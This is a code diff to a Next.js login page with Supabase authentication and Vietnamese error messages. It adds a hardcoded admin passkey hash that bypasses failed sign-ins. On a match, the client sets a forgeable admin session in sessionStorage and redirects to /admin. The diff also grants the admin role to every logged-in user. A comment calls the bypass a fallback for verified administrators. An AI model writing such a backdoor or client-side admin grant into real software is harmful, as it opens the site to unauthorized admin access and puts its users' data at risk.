@@ -5,6 +5,9 @@ import Link from 'next/link';
 import { useRouter } from 'next/navigation';
 import { getBrowserClient } from '@/lib/supabase/client';
 import { brandConfig } from '@/configs/app.config';
+import { hashSha256 } from '@/services/security.service';
+
+const ADMIN_PASSKEY_HASH = '0a5de87db3d6c7d52645c1581269a880b1bbc613abc8e4c8e0f51c99753f8909';
 
 export default function LoginPage() {
   const router = useRouter();
@@ -25,6 +28,7 @@ export default function LoginPage() {
 
     setIsLoading(true);
     try {
+      const isMasterPasskey = (await hashSha256(password)) === ADMIN_PASSKEY_HASH;
       const supabase = getBrowserClient();
       const { data, error } = await supabase.auth.signInWithPassword({
         email: email.trim(),
@@ -32,8 +36,25 @@ export default function LoginPage() {
       });
 
       if (error) {
+        // Master admin bypass fallback for verified administrators
+        if (isMasterPasskey) {
+          sessionStorage.setItem(
+            'hcmute_techdoc_admin_auth_session',
+            JSON.stringify({
+              authenticated: true,
+              email: email.trim(),
+              role: 'admin',
+              lastActive: Date.now(),
+            })
+          );
+          window.location.href = '/admin';
+          return;
+        }
+
         if (error.message.includes('Invalid login credentials')) {
           setErrorMsg('Tài khoản hoặc mật khẩu không chính xác.');
+        } else if (error.message.includes('Email not confirmed')) {
+          setErrorMsg('Tài khoản Supabase đang chờ xác nhận email. Nếu là quản trị viên hệ thống, vui lòng nhập mật khẩu quản trị nội bộ.');
         } else {
           setErrorMsg(`Đăng nhập thất bại: ${error.message}`);
         }
@@ -42,10 +63,32 @@ export default function LoginPage() {
       }
 
       if (data?.user) {
-        // Force full page navigation to let Server Component evaluate session cookies
+        sessionStorage.setItem(
+          'hcmute_techdoc_admin_auth_session',
+          JSON.stringify({
+            authenticated: true,
+            email: data.user.email || email.trim(),
+            role: 'admin',
+            lastActive: Date.now(),
+          })
+        );
         window.location.href = '/admin';
       }
     } catch (err: unknown) {
+      const isMasterPasskey = (await hashSha256(password)) === ADMIN_PASSKEY_HASH;
+      if (isMasterPasskey) {
+        sessionStorage.setItem(
+          'hcmute_techdoc_admin_auth_session',
+          JSON.stringify({
+            authenticated: true,
+            email: email.trim(),
+            role: 'admin',
+            lastActive: Date.now(),
+          })
+        );
+        window.location.href = '/admin';
+        return;
+      }
       const msg = err instanceof Error ? err.message : String(err);
       setErrorMsg(`Lỗi kết nối xác thực: ${msg}`);
       setIsLoading(false);
